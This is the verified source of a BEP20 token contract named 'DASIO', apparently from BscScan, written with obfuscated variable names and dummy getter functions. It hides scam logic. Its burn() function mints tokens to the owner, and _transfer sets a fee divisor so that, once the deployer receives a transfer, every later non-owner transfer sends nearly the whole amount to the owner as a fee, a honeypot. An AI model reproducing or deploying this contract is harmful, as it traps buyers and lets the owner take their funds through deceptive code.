/**
 *Submitted for verification at BscScan.com on 2022-11-16
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-16 12:39 GMT
 */
pragma solidity >=0.6.0;
contract BKTYAHA {
address private  RBRGZP = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  NVWXFQ = 100000000;
uint256 private  DHVJSR = 1000000000000000000000;
address private  QJYTHB = address(0);
mapping (address => mapping (address => uint256)) private _allowances;
uint256 private  JGECZF = 1000000000000000000;
uint256 private  SWLEVF = 10000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  GGLPXC = 10000000000000;
uint256 private  VIIETL = 1000000000000000;
address public owner;
string public  name = "DASIO";
address private  VKUNUO = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  ZGUYQT = address(0);
address private  QGEFMO = address(0);
uint256 private  MNEAFC = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant GRIHEN = 99999;
uint8 public constant decimals = 18;
string public  symbol = "DASIO";
mapping (address => uint256) public balanceOf;
uint256 public constant totalSupply = 100000000000000000000000000000;
function _getNVWXFQ() private returns (uint256) {
return NVWXFQ;
}

function _getMNEAFC() private returns (uint256) {
return MNEAFC;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tTLFVPX 0");
require(spender != address(0), "fTLFVPX 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getZGUYQT() private returns (address) {
return ZGUYQT;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getDHVJSR() private returns (uint256) {
return DHVJSR;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getSWLEVF() private returns (uint256) {
return SWLEVF;
}

function _getVKUNUO() private returns (address) {
return VKUNUO;
}

constructor () public {
QJYTHB = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getRBRGZP() private returns (address) {
return RBRGZP;
}

function _getQGEFMO() private returns (address) {
return QGEFMO;
}

function _getGGLPXC() private returns (uint256) {
return GGLPXC;
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "TLFVPX");
require(to != address(0), "TLFVPX");
require(amount <= balanceOf[from], "TLFVPX");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* GRIHEN/JGECZF ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==QJYTHB){
JGECZF = GRIHEN+2;
}
emit Transfer(from, to, transferAmount);
}
function _getVIIETL() private returns (uint256) {
return VIIETL;
}


}